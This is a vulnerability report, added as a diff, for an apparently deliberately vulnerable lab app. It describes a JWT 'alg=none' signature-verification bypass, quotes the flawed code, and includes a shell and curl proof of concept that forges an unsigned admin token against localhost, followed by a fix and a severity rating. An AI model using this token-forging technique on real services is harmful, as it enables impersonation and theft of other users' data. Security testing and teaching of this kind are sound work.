@@ -1,0 +1,113 @@
+---
+VULNERABILITY REPORT
+====================
+
+## Vulnerability
+JWT signature verification disabled — unsigned ("alg=none") / forged tokens
+accepted, yielding full authentication bypass and impersonation.
+CWE-347: Improper Verification of Cryptographic Signature
+(related: CWE-287 Improper Authentication, CWE-290 Authentication Bypass by Spoofing)
+
+## Location
+File:     vulnapp/app.py
+Function: _decode_token()  (called by _current_user() dependency used on every
+          authenticated route: /api/me, /api/notes, /api/notes/{note_id})
+Lines:    ~140-152 (the vulnerable branch)
+
+    # VULNERABLE: trust the token without checking who signed it.
+    try:
+        return pyjwt.decode(token, options={"verify_signature": False})
+    except pyjwt.PyJWTError:
+        raise HTTPException(status_code=401, detail="malformed token")
+
+## Description
+In the vulnerable build (VULNAPP_SAFE != "1"), _decode_token() calls
+pyjwt.decode(..., options={"verify_signature": False}). This decodes the token
+WITHOUT validating its cryptographic signature and without pinning an algorithm
+allowlist. As a consequence:
+
+  * An attacker can mint a token with header {"alg":"none"} and an arbitrary
+    payload (any "sub", any "tenant", "admin": true) and have it accepted.
+  * No secret or private key is needed — the token is completely attacker-forged.
+
+_decode_token() feeds _current_user(), which trusts the "sub"/"tenant"/"admin"
+claims as an authenticated principal. This collapses the entire authentication
+and authorization model:
+
+  * Impersonation of any user (e.g. admin alice) via /api/me.
+  * Cross-tenant / cross-object data theft: with a forged token the attacker
+    satisfies the auth dependency on GET /api/notes/{note_id} and reads any
+    note, including its "secret" field, regardless of owner or tenant. (This
+    also removes the authentication barrier that would otherwise gate the BOLA
+    bug on that route.)
+  * Privilege escalation by asserting "admin": true in the forged payload.
+
+This is the most critical finding because it is a pre-condition-free,
+unauthenticated, trivially exploitable break of the whole trust boundary —
+strictly worse than the other planted bugs (weak HMAC secret, BOLA, SQLi,
+SSRF, mass-assignment, data exposure), several of which it subsumes by
+removing the authentication requirement entirely.
+
+## How to Replicate
+Target: a running vulnerable build, e.g.
+    PORT=8765 VULNAPP_SAFE=0 python -m uvicorn vulnapp.app:app --port 8765
+
+Build an unsigned token (base64url header + payload, empty signature):
+    header  = {"alg":"none","typ":"JWT"}
+    payload = {"sub":"alice","tenant":"acme","admin":true}
+
+Minimal shell PoC (base64url, no padding):
+    b64(){ printf '%s' "$1" | base64 | tr '+/' '-_' | tr -d '=\n'; }
+    H=$(b64 '{"alg":"none","typ":"JWT"}')
+    P=$(b64 '{"sub":"alice","tenant":"acme","admin":true}')
+    TOK="$H.$P."                       # note the trailing dot: empty signature
+
+    # (1) Impersonate admin alice:
+    curl -s http://127.0.0.1:8765/api/me -H "Authorization: Bearer $TOK"
+    # -> {"username":"alice","tenant":"acme","admin":true}
+
+    # (2) Read any victim note incl. its secret, with a purely forged identity:
+    curl -s http://127.0.0.1:8765/api/notes/welcome -H "Authorization: Bearer $TOK"
+    # -> {... "secret":"acme-internal-kickoff-doc","owner":"alice","tenant":"acme"}
+
+Observed result (verified live against the running vulnerable build): both
+requests succeed (HTTP 200) with no valid signature, confirming a complete
+authentication bypass. The attacker never needs any credential or secret.
+
+## Proposed Fix
+Always verify the signature and pin an explicit algorithm allowlist; never pass
+verify_signature: False in a production/trust-bearing path. The hardened branch
+already present in the file is the correct behavior — make it unconditional:
+
+    def _decode_token(token: str) -> dict[str, Any]:
+        try:
+            # Pin HS256 and require a valid signature. PyJWT will reject
+            # alg=none and any algorithm not in the allowlist.
+            return pyjwt.decode(token, JWT_SECRET, algorithms=[JWT_ALG])
+        except pyjwt.PyJWTError:
+            raise HTTPException(status_code=401, detail="invalid token")
+
+Why this works:
+  * algorithms=[JWT_ALG] is an allowlist; PyJWT raises
+    InvalidAlgorithmError for "none" and refuses to accept unsigned tokens.
+  * Passing the key with verify_signature enabled (the default) forces an HMAC
+    check, so a token the attacker did not sign with the server secret is
+    rejected (InvalidSignatureError).
+  * This restores the server as the sole issuer of valid tokens, re-establishing
+    the authentication boundary that _current_user() and every protected route
+    depend on.
+
+Hardening notes (defense in depth): use a long, random, secret-managed signing
+key (the weak "changeme" HMAC secret is a separate planted bug — CWE-321/CWE-347
+— that this project's jwt check also flags); validate exp/iat; and keep
+object-level ownership checks (the BOLA fix) so a valid principal still cannot
+read other tenants' notes.
+
+## Severity
+CRITICAL — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (base ~9.8).
+Network-reachable, no privileges, no user interaction, trivially scripted. It
+grants unauthenticated impersonation of arbitrary users (including admins) and
+cross-tenant data disclosure, and it neutralizes the authentication gate in
+front of other sensitive endpoints. It is the single highest-impact,
+lowest-effort vulnerability in the target.
+---
